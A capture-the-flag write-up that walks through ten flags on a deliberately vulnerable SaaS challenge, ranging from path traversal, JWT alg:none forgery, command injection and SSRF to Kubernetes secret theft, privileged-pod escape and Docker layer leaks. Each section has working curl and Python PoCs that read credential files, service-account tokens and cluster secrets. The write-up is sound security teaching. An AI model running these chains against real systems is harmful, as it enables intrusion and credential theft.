# HamCTF — Break the SaaS Writeup

This writeup explains the 10 flags I captured on `ctf.seoeh.ir`.
The companion `extract.sh` prints the same 10 flags, one per line,
in the same order as the sections below.

---

## 1. Exposed Swagger / OpenAPI Schema

**Vulnerability.** The API schema at `/api/schema/` (and `/swagger.json`) is
served by `drf-spectacular` with no authentication. It lists every route of the
API — including hidden ones — and a flag is embedded right inside the
`info.description` field, so anyone who finds the schema is rewarded.

**Extraction.**
1. Requested the schema endpoint directly with `curl`.
2. The response was the full OpenAPI JSON document; grepping it for the flag
   pattern returned the flag sitting in `info.description`.
3. Read the same document to enumerate the hidden routes
   (`/api/internal/flag`, `/admin/dashboard`, …) that are used in the next steps.

**PoC.**
```bash
curl -sk https://ctf.seoeh.ir/api/schema/ | grep -oE 'HAMAMOOZ\{[^}]+\}'
```

---

## 2. Hidden Debug Endpoint (Header-Gated)

**Vulnerability.** `/api/internal/flag` is a hidden DRF route that returns a
flag whenever the request carries `X-Debug-Mode: true`. There is no real
authentication — the only gate is a client-controlled header — and the route
was clearly meant to be removed before production. It is discoverable from the
leaked Swagger schema.

**Extraction.**
1. Found the route inside the OpenAPI schema obtained in step 1.
2. Sent a plain GET first — no flag came back.
3. Resent the request with the header `X-Debug-Mode: true`; the endpoint
   returned `{"flag": "..."}` and I took the value from the JSON.

**PoC.**
```bash
curl -sk -H "X-Debug-Mode: true" https://ctf.seoeh.ir/api/internal/flag
```

---

## 3. Path Traversal in Report Download

**Vulnerability.** `/api/reports/download?file=` joins the user-supplied
parameter onto `/app/reports/` with `os.path.join` and no normalization, so
`../` sequences escape the directory and read arbitrary files. When the
resolved path is a folder, the endpoint even lists its contents, which made
reconnaissance trivial.

**Extraction.**
1. Listed the app directory with `file=..` and spotted `flag.txt` sitting next
   to the `reports/` folder.
2. Requested `file=../flag.txt`; the file content — the flag — came back.
3. Reused the same primitive to read `/proc/1/environ` (leaking the JWT secret
   `changeme123`) and
   `/var/run/secrets/kubernetes.io/serviceaccount/token` (the pod's Kubernetes
   credential), both of which are used in later steps.

**PoC.**
```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=.."
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt"
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../proc/1/environ" | tr '\0' '\n'
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token"
```

---

## 4. IDOR on Org Reports

**Vulnerability.** `/api/orgs/<org_id>/reports/<report_id>` returns the full
report — including its `secret_note` field — without any tenant ownership
check, and the view is marked `AllowAny`, so no authentication is required at
all. The seed script stored a flag inside the `secret_note` of Org 2's report.

**Extraction.**
1. Enumerated small org/report IDs against the endpoint without any token.
2. `GET /api/orgs/2/reports/2` returned
   `{"title": "Globex Internal Audit", "secret_note": "<flag>"}`.
3. Other ID combinations returned "not found" or decoy values, confirming the
   data is tenant-scoped by convention only.

**PoC.**
```bash
curl -sk https://ctf.seoeh.ir/api/orgs/2/reports/2
```

---

## 5. Weak JWT (`alg:none`)

**Vulnerability.** The custom JWT `decode()` helper reads the token header
with `get_unverified_header()` and, when the header says `alg: none`, decodes
the payload without verifying any signature. Anyone can therefore mint a token
with `role: admin`. As a second route, the HS256 secret is the well-known
default `changeme123` (also leaked by the `/proc/1/environ` read), so even a
properly signed token is forgeable.

**Extraction.**
1. Built a JWT whose header is `{"alg":"none","typ":"JWT"}` and whose payload
   is `{"sub":"1","role":"admin"}`, base64url-encoded with an empty signature.
2. Sent it as a `Bearer` token to `/admin/dashboard`.
3. The endpoint accepted the unsigned token and returned `{"flag": "..."}`.

**PoC.**
```bash
TOKEN=$(python3 -c "
import base64, json
def b(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({'sub':'1','role':'admin'}) + '.')
")
curl -sk -H "Authorization: Bearer $TOKEN" https://ctf.seoeh.ir/admin/dashboard
```

---

## 6. Command Injection in the Ping Tool

**Vulnerability.** `/api/diag/ping` builds its shell command by concatenating
the user-supplied `host` value directly into
`subprocess.run(f"ping -c 2 {host}", shell=True, ...)`. There is no validation
or escaping, so anything after a `;` is executed by the shell and its stdout is
returned in the JSON `output` field — full remote code execution inside the
backend pod.

**Extraction.**
1. Sent `host = "127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"` (the
   path is a constant visible in the backend's ping view).
2. The injected `cat` ran in the pod's shell and the flag appeared in the
   `output` field of the response.
3. Reused this injection as the transport for every Kubernetes step that
   follows, by sending base64-encoded scripts and executing them with
   `echo … | base64 -d | sh`.

**PoC.**
```bash
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

---

## 7. Kubernetes Secret Read via the Pod's Service Account

**Vulnerability.** The backend pod runs with a service account bound to a
cluster-wide reader role (`get/list/watch` on all resources). Its token file is
world-readable inside the pod, and with that token the Kubernetes API lists
every secret in the cluster — including a `flag-secret` whose `flag` field
holds the base64-encoded flag.

**Extraction.**
1. Leaked the service-account token with the path traversal from step 3 (it is
   the same token the pod uses at runtime).
2. Through the ping injection from step 6, executed a small Python script
   inside the backend pod.
3. The script read the token, queried
   `https://kubernetes.default.svc/api/v1/secrets`, iterated over all secrets
   and base64-decoded the `flag` field; the decoded flag came back in the ping
   response's `output`.

**PoC.**
```bash
INNER='python3 - <<"PY"
import urllib.request, json, base64, ssl
ctx = ssl._create_unverified_context()
tok = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req = urllib.request.Request("https://kubernetes.default.svc/api/v1/secrets",
                             headers={"Authorization": "Bearer " + tok})
d = json.load(urllib.request.urlopen(req, context=ctx, timeout=10))
for it in d["items"]:
    data = it.get("data") or {}
    if "flag" in data:
        print(base64.b64decode(data["flag"]).decode())
PY'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" \
  -d "{\"host\": \"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

---

## 8. SSRF via the Webhook Tester

**Vulnerability.** `/api/webhooks/test` accepts a `url`, a `method` and
optional `headers`, performs the request server-side with TLS verification
disabled and no destination allowlist, and returns the response body — a
direct window into cluster-internal services. The backend's own worker code
references the internal service name
`admin-panel.internal-tools.svc.cluster.local`, reachable only from inside the
cluster.

**Extraction.**
1. Pointed the webhook tester at the internal admin panel URL.
2. The backend fetched the page from inside the cluster and returned its HTML.
3. The flag was sitting in an HTML comment of that page; grepping the response
   body recovered it.

**PoC.**
```bash
curl -sk -X POST https://ctf.seoeh.ir/api/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url": "http://admin-panel.internal-tools.svc.cluster.local/", "method": "GET"}'
```

---

## 9. Privileged Pod Escape (hostPath)

**Vulnerability.** The `escape-zone` namespace runs a deliberately
misconfigured pod, `legacy-worker`: `privileged: true` with the node's root
filesystem mounted at `/host` via `hostPath: /`. Its init container writes a
flag file to the node's `/var/lib/node-data/`. Our service account has
`pods/exec` permission in that namespace and the backend image ships `kubectl`,
so the command injection is effectively a kubectl client.

**Extraction.**
1. From inside the backend pod (via the ping injection), read the mounted
   service-account token.
2. Ran `kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt`
   with that token.
3. Because the node's root appears under `/host` inside the privileged pod,
   the `cat` returned the node-level flag through the ping response.

**PoC.**
```bash
INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl \
  --server=https://kubernetes.default.svc --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt'
B64=$(printf '%s' "$INNER" | base64 | tr -d '\n')
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" \
  -d "{\"host\": \"127.0.0.1; echo $B64 | base64 -d | sh\"}"
```

---

## 10. Docker Layer Leak (Deleted `.env`)

**Vulnerability.** During the build, `.env` was `COPY`'d into the image and
later removed with `RUN rm`. In Docker this only adds a whiteout layer on top —
the file's bytes remain in the earlier layer that performed the `COPY`. The
image is published on a public Harbor registry, so anyone can pull its layers
and recover the deleted secret. This is the classic "docker layers never
forget" problem.

**Extraction.**
1. Obtained an anonymous pull token from `hub.hamdocker.ir` and pulled the
   image manifest.
2. Downloaded the layer blobs; one small blob (~180 bytes compressed)
   contained `app/.env` exactly as copied during the build.
3. Extracted that single layer with `tar` and read `app/.env` — the flag was
   inside. (The next layer only holds the `.wh..env` whiteout record, which is
   why the file is "deleted" but still recoverable.)

**PoC.**
```bash
TOK=$(curl -sk "https://hub.hamdocker.ir/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -sk -H "Authorization: Bearer $TOK" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  | tar xzO app/.env
```

---

## Summary

| #  | Vulnerability                        | Endpoint / Primitive            |
| -- | ------------------------------------ | ------------------------------- |
| 1  | Exposed OpenAPI schema               | `/api/schema/`                  |
| 2  | Header-gated debug endpoint          | `/api/internal/flag`            |
| 3  | Path traversal                       | `/api/reports/download`         |
| 4  | IDOR (cross-tenant read)             | `/api/orgs/2/reports/2`         |
| 5  | JWT `alg:none` / weak secret         | `/admin/dashboard`              |
| 6  | Command injection                    | `/api/diag/ping`                |
| 7  | Over-privileged service account      | Kubernetes API                  |
| 8  | SSRF to internal service             | `/api/webhooks/test`            |
| 9  | Privileged pod + hostPath mount      | `kubectl exec`                  |
| 10 | Docker layer leak (deleted `.env`)   | Harbor registry                 |